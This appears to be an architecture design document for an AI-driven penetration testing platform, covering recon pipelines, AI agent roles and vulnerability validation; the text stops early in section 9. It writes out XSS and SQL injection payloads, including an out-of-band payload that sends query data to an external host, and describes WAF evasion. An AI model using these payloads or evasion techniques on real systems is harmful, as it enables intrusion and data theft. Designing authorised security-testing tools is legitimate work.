# Autonomous AI Pentesting Platform — System Architecture

> **Version**: 2.0 — Next-Generation Design
> **Classification**: Architecture Design Document
> **Scope**: Full system redesign from Dynamic VAPT Framework → Autonomous AI Security Platform
> **Methodology**: Authorized penetration testing and bug bounty engagements only

---

## Table of Contents

1. [Master Architecture Diagram](#1-master-architecture-diagram)
2. [Autonomous Recon Engine](#2-autonomous-recon-engine)
3. [Intelligent Asset Graph](#3-intelligent-asset-graph)
4. [Parallel Scanning Engine](#4-parallel-scanning-engine)
5. [Token Optimization Strategy](#5-token-optimization-strategy)
6. [AI Pentesting Agents](#6-ai-pentesting-agents)
7. [Payload Intelligence Engine](#7-payload-intelligence-engine)
8. [Vulnerability Validation Engine](#8-vulnerability-validation-engine)
9. [Evidence Collection System](#9-evidence-collection-system)
10. [Attack Chain Intelligence](#10-attack-chain-intelligence)
11. [Reporting Engine](#11-reporting-engine)
12. [SaaS Security Platform Architecture](#12-saas-security-platform-architecture)
13. [Bug Bounty Hunter Mode](#13-bug-bounty-hunter-mode)
14. [Upgrade Roadmap](#14-upgrade-roadmap)

---

## 1. Master Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│                     AUTONOMOUS AI PENTESTING PLATFORM v2.0                      │
│                    (Authorized Security Testing Only)                            │
└─────────────────────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────────────────────┐
│  INGESTION LAYER                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐ │
│  │  config.yaml │  │  scope.json  │  │  API Gateway │  │   Web Dashboard      │ │
│  │  (targets,   │  │  (IP ranges, │  │  (SaaS REST) │  │   (Multi-tenant UI)  │ │
│  │   creds,     │  │   wildcards, │  │              │  │                      │ │
│  │   ROE)       │  │   exclusions)│  │              │  │                      │ │
│  └──────┬───────┘  └──────┬───────┘  └──────┬───────┘  └──────────┬───────────┘ │
└─────────┼─────────────────┼─────────────────┼───────────────────── ┼────────────┘
          └────────────────────────────────────┘                      │
                             │                                         │
                             ▼                                         ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│  ORCHESTRATION LAYER                                                             │
│  ┌────────────────────────────────────────────────────────────────────────────┐ │
│  │                      Master Orchestrator                                    │ │
│  │   Phase Manager │ Task Scheduler │ Agent Registry │ Authorization Guard    │ │
│  └────────────────────────────────────────────────────────────────────────────┘ │
│          │              │              │              │              │            │
│          ▼              ▼              ▼              ▼              ▼            │
│  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐    │
│  │  Recon    │  │Enumeration│  │  Vuln     │  │  PoC/     │  │  Report   │    │
│  │  Queue    │  │  Queue    │  │  Queue    │  │  Exploit  │  │  Queue    │    │
│  │           │  │           │  │           │  │  Queue    │  │           │    │
│  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘    │
└────────┼──────────────┼──────────────┼──────────────┼──────────────┼────────── ┘
         │              │              │              │              │
         ▼              ▼              ▼              ▼              ▼
┌────────────────────────────────────────────────────────────────────────────────┐
│  EXECUTION LAYER — Worker Pools                                                 │
│                                                                                  │
│  ┌──────────────────┐   ┌──────────────────┐   ┌──────────────────┐            │
│  │  Recon Workers   │   │  Scan Workers    │   │  Validation      │            │
│  │  (N=50 parallel) │   │  (N=200 parallel)│   │  Workers         │            │
│  │                  │   │                  │   │  (N=100 parallel)│            │
│  │ subfinder|amass  │   │ nuclei|ffuf      │   │  curl|playwright  │            │
│  │ dnsx|httpx       │   │ sqlmap|jwt_tool  │   │  PoC replay      │            │
│  │ gau|katana       │   │ nikto|sslyze     │   │  screenshot cap  │            │
│  └──────────────────┘   └──────────────────┘   └──────────────────┘            │
└────────────────────────────────────────────────────────────────────────────────┘
         │                      │                       │
         ▼                      ▼                       ▼
┌────────────────────────────────────────────────────────────────────────────────┐
│  INTELLIGENCE LAYER                                                              │
│                                                                                  │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────────────────────┐ │
│  │  Asset Graph DB │  │  AI Agent Pool  │  │  Payload Intelligence Engine    │ │
│  │  (Neo4j/ArangoDB│  │                 │  │                                 │ │
│  │  Graph of:      │  │  ReconAgent     │  │  Context-aware payload gen      │ │
│  │  domains→subs   │  │  AssetAnalysis  │  │  Mutation engine                │ │
│  │  subs→endpoints │  │  VulnDiscovery  │  │  Sink-aware XSS builder         │ │
│  │  endpoints→vulns│  │  ExploitValid   │  │  Encoding/evasion engine        │ │
│  │  vulns→chains   │  │  AttackGraph    │  │                                 │ │
│  └─────────────────┘  └─────────────────┘  └─────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────────────┘
         │                      │                       │
         ▼                      ▼                       ▼
┌────────────────────────────────────────────────────────────────────────────────┐
│  STORAGE LAYER                                                                   │
│                                                                                  │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  ┌──────────────────┐   │
│  │  PostgreSQL  │  │  Redis       │  │  S3/Minio    │  │  Elasticsearch   │   │
│  │  (Tenants,   │  │  (Task queue │  │  (Evidence:  │  │  (Findings full- │   │
│  │   findings,  │  │   cache,     │  │   screenshots│  │   text search,   │   │
│  │   reports,   │  │   sessions,  │  │   HTTP logs  │  │   vuln history,  │   │
│  │   audit log) │  │   rate limit)│  │   payloads)  │  │   asset index)   │   │
│  └──────────────┘  └──────────────┘  └──────────────┘  └──────────────────┘   │
└────────────────────────────────────────────────────────────────────────────────┘
         │
         ▼
┌────────────────────────────────────────────────────────────────────────────────┐
│  OUTPUT LAYER                                                                    │
│                                                                                  │
│  ┌───────────────┐  ┌───────────────┐  ┌──────────────┐  ┌──────────────────┐ │
│  │  HTML/PDF     │  │  Email SMTP   │  │  Bug Bounty  │  │  REST API        │ │
│  │  Reports      │  │  Alerts       │  │  Submission  │  │  Webhooks        │ │
│  │  (Exec+Tech)  │  │  (per finding)│  │  (HackerOne, │  │  (Jira, Slack,  │ │
│  │               │  │               │  │   Bugcrowd)  │  │   PagerDuty)    │ │
│  └───────────────┘  └───────────────┘  └──────────────┘  └──────────────────┘ │
└────────────────────────────────────────────────────────────────────────────────┘
```

---

## 2. Autonomous Recon Engine

### Design Philosophy

The recon engine operates as a continuous, event-driven pipeline. It does not run as a single batch job. Instead it monitors the target's attack surface perpetually, emitting signals whenever new assets appear or existing ones change. This mirrors the operational model used by elite bug bounty hunters who run automation 24/7.

### Stage Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        RECON PIPELINE (7 Stages)                            │
└─────────────────────────────────────────────────────────────────────────────┘

STAGE 1: PASSIVE ASSET DISCOVERY
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: root domain(s) from scope                                           │
│                                                                              │
│  Parallel workers:                                                           │
│  ├── subfinder      → passive subdomain enumeration (100+ sources)          │
│  ├── amass (passive)→ certificate transparency + OSINT                      │
│  ├── assetfinder    → permutation + web crawl                               │
│  ├── crt.sh query  → certificate transparency logs                         │
│  ├── SecurityTrails → historical DNS + passive DNS databases                │
│  └── GitHub search  → org/* repos for internal hostnames                   │
│                                                                              │
│  Deduplication → Asset normalization → Emit to Stage 2                      │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 2: ACTIVE DNS RESOLUTION
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: raw subdomain list from Stage 1                                     │
│                                                                              │
│  Tools:                                                                      │
│  ├── dnsx (bulk resolver, rate-limited)                                     │
│  │   → A, AAAA, CNAME, MX, TXT, NS records                                 │
│  ├── subjack / can-i-take-over-xyz                                          │
│  │   → CNAME dangling → subdomain takeover detection                        │
│  └── massdns (for scale: 10k+ subdomains)                                  │
│                                                                              │
│  Output: resolved IPs + DNS record map + takeover candidates                │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 3: LIVE HOST DETECTION
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: resolved subdomains + IPs                                           │
│                                                                              │
│  Tools:                                                                      │
│  ├── httpx  → HTTP/HTTPS probing (status, title, tech fingerprint, CDN)    │
│  ├── naabu  → port scanning (top 1000 + custom port list)                  │
│  └── nmap   → service version detection on interesting ports                │
│                                                                              │
│  Outputs:                                                                    │
│  ├── Live hosts with HTTP/HTTPS response metadata                           │
│  ├── Technology fingerprints (server, framework, CDN, WAF)                 │
│  └── SSL/TLS certificate data (Subject Alt Names → new subdomains)         │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 4: HISTORICAL ENDPOINT COLLECTION
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: live hosts                                                           │
│                                                                              │
│  Tools:                                                                      │
│  ├── gau (getallurls)   → URLScan + Wayback + OTX + Common Crawl           │
│  ├── waybackurls        → Internet Archive URL corpus                       │
│  └── github-endpoints   → source code URL extraction                        │
│                                                                              │
│  Post-processing:                                                            │
│  ├── Filter out static assets (images, fonts, generic JS libs)             │
│  ├── Group URLs by path pattern (strip UUIDs → parameterized paths)        │
│  ├── Identify versioned API paths (/api/v1/, /api/v2/)                     │
│  └── Detect parameter names from historical query strings                   │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 5: ACTIVE CRAWL + JS ENDPOINT EXTRACTION
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: live hosts + seed URLs                                              │
│                                                                              │
│  Tools:                                                                      │
│  ├── katana          → headless crawl (respects JS rendering, SPAs)        │
│  ├── hakrawler       → fast link extraction                                 │
│  ├── linkfinder      → extract endpoints from .js files via regex          │
│  ├── secretfinder    → secrets in JS (API keys, tokens, credentials)       │
│  └── trufflehog      → deep git history secret scanning                    │
│                                                                              │
│  JS Analysis Pipeline:                                                       │
│  ├── Download all .js files from each host                                 │
│  ├── Beautify minified JS                                                   │
│  ├── Extract: fetch()/XHR URLs, axios.* calls, GraphQL query strings       │
│  ├── Identify sink functions for XSS: innerHTML, document.write, eval()    │
│  └── Identify source→sink data flows for DOM XSS analysis                  │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 6: PARAMETER DISCOVERY
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: endpoint corpus from Stages 4+5                                     │
│                                                                              │
│  Tools:                                                                      │
│  ├── paramspider     → spider for parameter discovery                       │
│  ├── arjun           → HTTP parameter brute-force (hidden param discovery) │
│  ├── x8              → parameter miner (fast, multi-threaded)              │
│  └── Custom pattern matching on historical URLs                             │
│                                                                              │
│  Output: parameter map { endpoint → [param1, param2, ...] }                │
│  Each parameter tagged with: source (URL/body/header/cookie), type         │
│  (integer/string/UUID/JSON), reflection behavior                            │
└────────────────────────────────────────────────────────────────────────────┘
          │
          ▼
STAGE 7: API SCHEMA DISCOVERY
┌────────────────────────────────────────────────────────────────────────────┐
│  Input: all discovered endpoints                                             │
│                                                                              │
│  Discovery methods:                                                          │
│  ├── Probe /swagger.json, /openapi.json, /api-docs, /graphql               │
│  ├── Postman collection export from JS analysis                             │
│  ├── graphql-cop for GraphQL introspection                                  │
│  └── WSDL/SOAP discovery for legacy APIs                                   │
│                                                                              │
│  Output: machine-readable API schema → feeds directly into Enum Agent      │
└────────────────────────────────────────────────────────────────────────────┘
```

### Pipeline Orchestration Model

All 7 stages are wired into an event-driven pipeline using a message broker (Redis Streams or Kafka). Each stage subscribes to its input topic and publishes to its output topic. This means Stage 2 begins processing the first subdomain from Stage 1 before Stage 1 completes — eliminating waterfall latency.

**Rate Limiting Contract**: Each tool wrapper enforces domain-level rate limits (configurable per engagement: default 10 req/s per host). A central rate limiter in Redis tracks per-host request counters with TTL windows.

**Scope Enforcement Gate**: Every asset emitted from every stage passes through an `AuthorizationGuard` that validates it against `scope.json` before any further processing. Assets outside scope are dropped and logged.

---

## 3. Intelligent Asset Graph

### Why a Graph Database Instead of JSON Files

The current JSON flat-file knowledge base cannot express the relationships between assets that matter for attack chain discovery. A graph database makes the following queries trivially fast:

- "Find all endpoints that share an auth session with this IDOR endpoint"
- "Which subdomains resolve to the same IP as the confirmed SSRF target?"
- "What is the full privilege escalation path from this unauthenticated endpoint to admin?"

### Graph Schema

```
NODE TYPES
──────────
(:Domain)           → root domain
(:Subdomain)        → discovered subdomain
(:IPAddress)        → resolved IP
(:Port)             → open port
(:Endpoint)         → HTTP URL + method
(:Parameter)        → query/body/header parameter
(:AuthMechanism)    → JWT, session cookie, API key, OAuth token
(:Vulnerability)    → discovered finding (DRAFT → VERIFIED → CONFIRMED)
(:PoCResult)        → validation result with evidence
(:AttackChain)      → connected sequence of vulnerabilities
(:Technology)       → framework, server, library fingerprint
(:Certificate)      → TLS cert with SANs
(:Secret)           → leaked credential, API key, token
(:JSFile)           → JavaScript file with sinks/sources

EDGE TYPES (RELATIONSHIPS)
──────────────────────────
(:Domain)-[:HAS_SUBDOMAIN]→(:Subdomain)
(:Subdomain)-[:RESOLVES_TO]→(:IPAddress)
(:IPAddress)-[:HAS_PORT]→(:Port)
(:Subdomain)-[:HAS_ENDPOINT]→(:Endpoint)
(:Endpoint)-[:ACCEPTS_PARAMETER]→(:Parameter)
(:Endpoint)-[:PROTECTED_BY]→(:AuthMechanism)
(:Endpoint)-[:HAS_VULNERABILITY]→(:Vulnerability)
(:Vulnerability)-[:VALIDATED_BY]→(:PoCResult)
(:Vulnerability)-[:LEADS_TO]→(:Vulnerability)   ← ATTACK CHAIN EDGE
(:Vulnerability)-[:PART_OF]→(:AttackChain)
(:Subdomain)-[:RUNS]→(:Technology)
(:Endpoint)-[:LOADS_JS]→(:JSFile)
(:JSFile)-[:EXPOSES_SECRET]→(:Secret)
(:JSFile)-[:HAS_SINK]→(:Parameter)
(:AuthMechanism)-[:ISSUES_TOKEN_TYPE]→(:Technology)
```

### Graph Query Examples for Attack Chain Discovery

```
// Find IDOR → Account Takeover chains
MATCH (v1:Vulnerability {type:"IDOR"})-[:AFFECTS]→(e1:Endpoint)
      -[:PROTECTED_BY]→(auth:AuthMechanism)
      ←[:PROTECTED_BY]-(e2:Endpoint)-[:HAS_VULNERABILITY]→(v2:Vulnerability {type:"AUTH_BYPASS"})
RETURN v1, v2

// Find SSRF targets with cloud metadata access potential
MATCH (v:Vulnerability {type:"SSRF"})-[:AFFECTS]→(e:Endpoint)
      -[:RESOLVES_TO]→(ip:IPAddress)
WHERE ip.cloud_provider IS NOT NULL
RETURN v, ip.cloud_provider

// Find all unprotected admin endpoints
MATCH (e:Endpoint {path: ~".*admin.*"})
WHERE NOT (e)-[:PROTECTED_BY]→(:AuthMechanism {type:"session"})
RETURN e
```

### Continuous Graph Updates

The graph is updated in real-time as each pipeline stage completes. A `GraphSyncWorker` subscribes to all pipeline output topics and writes new nodes/edges within transactions. This means by the time the vulnerability scanner runs, the asset graph already reflects every endpoint discovered during recon.

---

## 4. Parallel Scanning Engine

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                    PARALLEL SCANNING ENGINE                      │
└─────────────────────────────────────────────────────────────────┘

                    ┌─────────────────┐
                    │   Task Broker   │
                    │   (Redis/Kafka) │
                    └────────┬────────┘
                             │
              ┌──────────────┼──────────────┐
              │              │              │
              ▼              ▼              ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
    │ RECON QUEUE  │ │  ENUM QUEUE  │ │  VULN QUEUE  │
    │ (asset_disc) │ │ (endpoints)  │ │ (findings)   │
    │              │ │              │ │              │
    │ Priority:    │ │ Priority:    │ │ Priority:    │
    │ FIFO per host│ │ endpoint     │ │ severity-    │
    │              │ │ complexity   │ │ weighted     │
    └──────┬───────┘ └──────┬───────┘ └──────┬───────┘
           │                │                │
           ▼                ▼                ▼
    ┌──────────────┐ ┌──────────────┐ ┌──────────────────────────┐
    │ RECON WORKERS│ │ ENUM WORKERS │ │ VULN + VALIDATION WORKERS│
    │ Pool: 50     │ │ Pool: 200    │ │ Pool: 100                │
    │              │ │              │ │                          │
    │ Per worker:  │ │ Per worker:  │ │ Subpools:                │
    │ - 1 domain   │ │ - 10 URLs   │ │ - 40 nuclei              │
    │ - full recon │ │ - ffuf scan  │ │ - 20 sqlmap (safe mode)  │
    │   pipeline   │ │ - auth probe │ │ - 20 playwright PoC      │
    │              │ │ - param mine │ │ - 20 curl replay         │
    └──────────────┘ └──────────────┘ └──────────────────────────┘
```

### Task Priority System

```
Priority Levels (highest → lowest):

P0 — CRITICAL FINDINGS    → immediate validation, all workers available
P1 — ACTIVE ENGAGEMENT    → current scan phase tasks
P2 — BACKGROUND RECON     → continuous monitoring tasks
P3 — HISTORICAL ANALYSIS  → processing cached/archived data
P4 — MAINTENANCE          → graph cleanup, deduplication, indexing
```

### Scan Scheduler Design

The scheduler is a stateful component that:

1. **Pulls tasks** from priority queues and assigns them to available workers
2. **Enforces rate limits** per-host using token bucket algorithm in Redis
3. **Detects WAF responses** (429, 403 patterns) and automatically backs off
4. **Requeues failed tasks** with exponential backoff (max 3 retries)
5. **Tracks worker health** and redistributes tasks from dead workers
6. **Emits scan progress events** consumed by the web dashboard

### Deduplication at Scale

Before any task is queued, it is checked against a Bloom filter for exact-match deduplication and a MinHash LSH index for near-duplicate detection. This prevents redundant work when the same endpoint is discovered through multiple recon paths.

---

## 5. Token Optimization Strategy

### The Core Problem

LLMs are expensive and slow when used for every decision. The architecture must use AI reasoning surgically — only where deterministic tools cannot produce good enough results.

### Decision Tree: AI vs. Deterministic

```
TASK                              → APPROACH
──────────────────────────────────────────────────────────────────
Subdomain enumeration             → 100% deterministic (subfinder)
DNS resolution                    → 100% deterministic (dnsx)
Live host detection               → 100% deterministic (httpx)
Port scanning                     → 100% deterministic (naabu)
Nuclei template matching          → 100% deterministic
SQLi detection (error-based)      → 100% deterministic (sqlmap)
XSS detection (reflected, basic)  → 100% deterministic (dalfox)
Directory brute-force             → 100% deterministic (ffuf)
SSL/TLS analysis                  → 100% deterministic (sslyze)

Business logic flaw analysis      → AI required
Attack chain construction         → AI required
Payload context adaptation        → AI for template, deterministic for mutate
PoC script writing                → AI for structure, template for fill
Executive report narrative        → AI required (once per engagement)
Triage: false positive vs. real   → AI assisted (secondary check only)
Complex auth flow analysis        → AI required
```

### Token Reduction Mechanisms

**1. Context Slicing**

Instead of passing full HTTP responses to the LLM, a pre-processor extracts only the fields relevant to the current analysis task:

```
Full HTTP Response (15,000 tokens) → Analysis Slice (200 tokens)
 - Status code
 - Content-Type
 - Relevant headers (X-Frame-Options, CORS, Auth headers)
 - Response body: first 500 chars + parameter reflection locations only
```

**2. Embedding-Based Knowledge Search**

The vulnerability knowledge base (CVEs, CWEs, known patterns) is stored as vector embeddings (OpenAI `text-embedding-3-small` or local `nomic-embed-text`). When an agent needs context, it performs a semantic search returning only the 3 most relevant entries rather than loading the entire KB.

**3. Structured Output Templates**

Every AI agent call uses strict JSON schema output via function calling / structured outputs. This eliminates free-form text parsing and reduces output tokens by 60-70%.

**4. Agent Memory Compression**

Each agent maintains a rolling window memory of its last N actions. When the window fills, a `MemoryCompressor` runs a summarization call that distills 2,000 tokens of action history into a 200-token summary. The summary replaces the history in context.

**5. Chunk Processing for Large Assets**

Large JS files or response bodies are chunked and processed in parallel by lightweight deterministic extractors. Only the anomalous chunks (containing sinks, secrets, unusual patterns) are sent to the LLM for deeper analysis.

**6. Caching LLM Responses**

All LLM calls are hashed (prompt hash → response). The cache layer checks if an identical analysis has been performed within this engagement or across historical engagements. Repeated patterns (same tech stack, same vulnerability type) hit the cache at >40% rate.

### Token Budget per Engagement Phase

```
Phase              Budget (tokens)    LLM Calls
─────────────────────────────────────────────────
Recon              ~500               1-2 (scope analysis only)
Enumeration        ~2,000             5-10 (auth flow analysis)
Vulnerability Disc ~5,000             20-40 (triage + context)
PoC Validation     ~1,000             2-5 (per vuln, replay analysis)
Attack Chain       ~3,000             10-15 (chain construction)
Report Generation  ~8,000             3-5 (narrative generation)
─────────────────────────────────────────────────
Total per engagement: ~20,000 tokens  (90% reduction from naive approach)
```

---

## 6. AI Pentesting Agents

### Agent Registry Architecture

All agents are registered in a central `AgentRegistry`. The orchestrator queries the registry to assemble phase pipelines. Agents declare their capabilities, required inputs, and emitted outputs as typed schemas. This allows the orchestrator to wire agents dynamically based on what the current scan phase requires.

### Agent Definitions

---

#### ReconAgent

**Responsibility**: Coordinate and execute the full 7-stage recon pipeline. Consume root domains from scope, orchestrate tool execution, dedup results, and emit structured asset records to the graph DB.

**Decision-making (AI)**: Determines which recon stages to run based on the target type (single domain vs. wildcard vs. IP range). Adjusts tool selection for targets behind CDNs or WAFs.

**Emits**: `AssetRecord` events → Asset Graph

---

#### AssetAnalysisAgent

**Responsibility**: Analyze discovered assets and classify them by attack surface value. Prioritizes the endpoint queue — not all endpoints need deep scanning.

**Scoring model** (deterministic):
```
Score = (technology_weight × 3) + (auth_presence × 4) + (param_count × 2)
         + (historical_vuln_hit × 5) + (admin_path_match × 4)
```

**Decision-making (AI)**: Reviews clusters of low-confidence assets and applies heuristic reasoning to decide if they warrant deep scanning.

**Emits**: `PrioritizedEndpointBatch` events → Enumeration Queue

---

#### EndpointDiscoveryAgent

**Responsibility**: Take each live host and expand its endpoint surface. Runs ffuf wordlists, crawls, API schema discovery. Maintains a per-host endpoint fingerprint to avoid re-scanning unchanged surfaces (delta scanning).

**Delta scanning**: Endpoint fingerprints are stored in the graph. On rescan, only endpoints with changed `Last-Modified`, ETag, or content hash are reprocessed.

**Emits**: `EndpointRecord` events → Endpoint nodes in graph

---

#### ParameterMiningAgent

**Responsibility**: For each discovered endpoint, discover all accepted parameters. Runs arjun/x8 for hidden parameter mining. Classifies each parameter by type and injection potential.

**Classification logic**:
```
Parameter types and likely vulnerabilities:
 → id, user_id, uid, account_id   → IDOR/BOLA candidate
 → url, callback, redirect, next  → SSRF/Open Redirect candidate
 → query, search, q, filter       → SQLi / XSS candidate
 → file, path, template, page     → Path Traversal / SSTI candidate
 → cmd, exec, command             → Command Injection candidate
 → token, jwt, session            → Auth token analysis candidate
```

**Emits**: `ParameterProfile` per endpoint → attached to Endpoint node in graph

---

#### VulnerabilityDiscoveryAgent

**Responsibility**: Run vulnerability checks against each endpoint based on its parameter profile and technology fingerprint. Orchestrates nuclei templates, custom checks, and targeted scanners.

**Scan matrix** (deterministic mapping: technology + param type → scanner selection):
```
Tech: JWT auth    → jwt_tool checks (none, alg, weak secret)
Tech: GraphQL     → graphql-cop (introspection, batching, injection)
Tech: WordPress   → nuclei wordpress templates
Param: id=INT     → IDOR check + BOLA check
Param: url=*      → SSRF check + Open Redirect check
Param: q=*        → SQLi + XSS check
```

**Decision-making (AI)**: Handles ambiguous findings where deterministic tools produce uncertain results. Reads the raw response and reasons about whether the anomaly is a genuine vulnerability.

**Emits**: `DraftVulnerability` events → Vulnerability nodes (status: DRAFT)

---

#### ExploitValidationAgent

**Responsibility**: Take each DRAFT vulnerability and confirm it through automated PoC execution. Uses terminal mode (curl) or browser mode (Playwright) depending on vulnerability type. Runs each PoC 3 times and requires 2/3 success for VERIFIED status.

**Validation matrix**:
```
Vuln Type              → Validation Method
─────────────────────────────────────────────────────
IDOR / BOLA            → curl: replay with different account credentials
SQLi (error-based)     → curl: verify distinctive error message appears
SQLi (blind/time)      → curl: verify ≥2s delay with sleep() payload
XSS (reflected)        → Playwright: verify alert() fires or DOM mutation
XSS (stored)           → Playwright: store payload, retrieve, verify execution
SSRF                   → interactsh: verify DNS/HTTP callback received
CORS misconfiguration  → curl: verify Access-Control-Allow-Origin: attacker.com
Open Redirect          → curl/Playwright: verify redirect to external domain
Command Injection      → interactsh / time-based: verify OOB or delay
JWT vulns              → jwt_tool: verify forged token is accepted
Auth Bypass            → curl: verify privileged response without credentials
```

**Emits**: `ValidatedVulnerability` events → status: POC_VERIFIED; evidence stored in S3

---

#### AttackGraphAgent

**Responsibility**: Query the asset graph for vulnerability relationships and construct multi-step attack chains. Assigns exploitability and business impact scores to each chain.

**Chain detection patterns** (see Section 10 for details).

**Decision-making (AI)**: Given a set of verified vulnerabilities, reasons about which combinations produce meaningful attack chains. Generates the narrative explanation of each chain.

**Emits**: `AttackChain` records → AttackChain nodes in graph

---

#### ReportAgent

**Responsibility**: Pull all CONFIRMED vulnerabilities, PoC evidence, and attack chains from the graph and generate professional reports in multiple formats.

**Decision-making (AI)**: Generates executive narrative, risk summary, and remediation recommendations. All AI-generated text is clearly marked as such in the output.

**Emits**: HTML + PDF reports to S3; email notifications to configured recipients

---

### Agent Collaboration Protocol

Agents communicate through the graph database and the task queue. They do not call each other directly. This decoupled architecture means:

- Any agent can be restarted without affecting others
- Agents can be scaled independently (more ExploitValidationAgents during PoC phase)
- New agents can be added without modifying existing ones

---

## 7. Payload Intelligence Engine

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                  PAYLOAD INTELLIGENCE ENGINE                     │
│                                                                  │
│   Context Input                                                  │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  vuln_type + sink_type + encoding + WAF_signature       │   │
│   └───────────────────────┬─────────────────────────────────┘   │
│                           │                                      │
│                           ▼                                      │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │              Payload Selector                            │   │
│   │  Queries payload library by: vuln_type × context_type  │   │
│   │  Returns: ranked payload candidates                     │   │
│   └───────────────────────┬─────────────────────────────────┘   │
│                           │                                      │
│                           ▼                                      │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │              Mutation Engine                             │   │
│   │  Applies transformations based on observed WAF behavior │   │
│   └───────────────────────┬─────────────────────────────────┘   │
│                           │                                      │
│                           ▼                                      │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │              Encoder/Obfuscator                          │   │
│   │  URL encode / HTML entity / Unicode / base64 layers     │   │
│   └───────────────────────┬─────────────────────────────────┘   │
│                           │                                      │
│                           ▼                                      │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │              Validation Filter                           │   │
│   │  Removes payloads that trigger WAF → learns pattern     │   │
│   └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### XSS Payload Generation by Sink Type

```
SINK TYPE              CONTEXT              PAYLOAD STRATEGY
──────────────────────────────────────────────────────────────────────────────
innerHTML              HTML body            <img src=x onerror=alert(1)>
                                           <svg/onload=alert(1)>
innerHTML              Inside attribute     " onmouseover="alert(1)
innerHTML              Inside script block  ';alert(1)//
document.write()       HTML body            Same as innerHTML + full tags
eval()                 JS string            alert(1)  (no tags needed)
location.href          URL context          javascript:alert(1)
jQuery $()             Selector context     <img src=1 onerror=alert(1)>
React dangerouslySet   HTML body            Standard HTML payloads
```

### SQL Injection Payload Generation by Type

```
TECHNIQUE          DETECTION METHOD         EXAMPLE PAYLOADS
──────────────────────────────────────────────────────────────────────────────
Error-based        Distinctive DB error     ' OR 1=CONVERT(int,'a')--
                   in response              ' AND extractvalue(1,concat(...))
Boolean-based      Response length diff     ' AND 1=1-- (vs) ' AND 1=2--
Time-based         Response delay           ' AND SLEEP(5)--
                                           '; WAITFOR DELAY '0:0:5'--
Out-of-band        External callback        ' AND load_file(concat('\\\\',
                   (interactsh)             (SELECT ...),'.oast.fun\\'))
```

### Mutation Engine

The mutation engine takes a baseline payload and produces variants through:

1. **Case mutation**: `<SCRIPT>` → `<ScRiPt>` → `<script>`
2. **Space substitution**: `<script>` → `<script\t>` → `<script\n>`
3. **Comment injection**: `<sc<!--comment-->ript>`
4. **Encoding layers**: URL encode → double URL encode → HTML entity
5. **Null byte injection**: between characters at known WAF check points
6. **Truncation attacks**: find WAF max-length threshold and craft payload at boundary

**WAF fingerprinting** precedes mutation: the engine sends known WAF trigger strings and observes response codes/bodies to identify the WAF product (Cloudflare / Akamai / AWS WAF / ModSecurity). It then selects the mutation strategy from a WAF-specific bypass library.

---

## 8. Vulnerability Validation Engine

### False Positive Reduction Pipeline

```
FINDING STATUS PROGRESSION

  DETECTED (raw signal from scanner)
       │
       ▼ [Secondary Validation Check]
  CANDIDATE (confirmed signal pattern, not yet replayed)
       │
       ▼ [PoC Execution × 3]
  POC_VERIFIED (2/3 replay attempts succeed with concrete evidence)
       │
       ▼ [User/Analyst Review — Step 5 of Interactive Init]
  CONFIRMED (human validated, evidence reviewed)
       │
       ▼ [Report Generation]
  REPORTED
```

### Validation Logic per Vulnerability Type

**IDOR Validation**:
1. Authenticate as Account A, retrieve resource ID `X`
2. Authenticate as Account B, request resource ID `X`
3. Compare responses: if Account B gets Account A's data → VERIFIED
4. Cross-tenant variant: if single-tenant → skip; if multi-tenant → additional check

**SQLi Validation (Boolean)**:
1. Send payload `' AND 1=1--` → record response body hash H1
2. Send payload `' AND 1=2--` → record response body hash H2
3. If H1 ≠ H2 AND the difference is semantically consistent → CANDIDATE
4. Send 5 additional boolean pairs to confirm consistent differential → VERIFIED

**SQLi Validation (Time-based)**:
1. Establish baseline response time T_base (average of 5 requests)
2. Send `' AND SLEEP(5)--` → record T_exploit
3. If T_exploit ≥ T_base + 4.5s → CANDIDATE
4. Repeat 3 times with different sleep values (3s, 7s, 10s) → VERIFIED if all pass

**XSS Validation (Playwright)**:
1. Navigate to vulnerable URL with payload injected
2. Register dialog listener (alert, confirm, prompt)
3. Wait 5 seconds for execution
4. If dialog detected → capture screenshot → VERIFIED
5. For DOM XSS: verify DOM mutation at target sink via JS evaluation

**SSRF Validation (Interactsh)**:
1. Generate unique SSRF interaction URL via interactsh
2. Inject as SSRF payload value in vulnerable parameter
3. Poll interactsh API for DNS/HTTP callback within 30 seconds
4. If callback received with matching unique ID → VERIFIED

### Confidence Scoring

Each finding has a confidence score (0.0 → 1.0) computed as:

```
confidence = (validation_success_rate × 0.5)
           + (distinct_evidence_types × 0.2)
           + (reproducibility_score × 0.2)
           + (response_semantic_match × 0.1)
```

Findings below 0.7 confidence are flagged NEEDS_REVIEW rather than POC_VERIFIED.

---

## 9. Evidence Collection System

### Evidence Storage Architecture

```
S3 / MinIO Object Storage
└── evidence/
